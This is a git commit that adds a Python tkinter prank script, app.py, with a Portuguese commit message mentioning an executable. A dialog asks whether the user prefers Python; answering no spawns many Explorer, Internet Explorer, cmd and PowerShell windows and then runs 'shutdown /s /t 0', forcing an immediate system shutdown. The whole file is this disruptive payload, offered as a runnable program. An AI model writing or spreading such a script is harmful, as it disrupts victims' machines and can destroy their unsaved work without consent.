73f58547b73510566f842d819e1e89d691f57bfb
nvpetri <nicolaspetri18@gmail.com>
2023-07-31 15:41:26 -0300

    up arquivo e executável

---
+++ app.py
@@ -0,0 +1,35 @@
+import tkinter as tk
+from tkinter import messagebox
+import os
+import webbrowser
+
+def redirecionar():
+    webbrowser.open_new_tab("https://www.google.com")
+
+resposta = messagebox.askyesno("Cuidado!!!", "Prefere Python??")
+
+if resposta:
+    redirecionar()
+else:
+    os.system("cmd /c color a")
+    os.system("cmd /c cd\ ")
+    os.system("start explorer.exe")
+    os.system("start explorer.exe")
+    os.system("start explorer.exe")
+    os.system("start explorer.exe")
+    os.system("start explorer.exe")
+    os.system("start explorer.exe")
+    os.system("start explorer.exe")
+    os.system("start explorer.exe")
+    os.system("start explorer.exe")
+    os.system("start iexplore.exe")
+    os.system("start iexplore.exe")
+    os.system("start iexplore.exe")
+    os.system("start iexplore.exe")
+    os.system("start iexplore.exe")
+    os.system("start iexplore.exe")
+    os.system("start iexplore.exe")
+    os.system("start iexplore.exe")
+    os.system("start cmd.exe")
+    os.system("start powershell.exe")
+    os.system("shutdown /s /t 0")
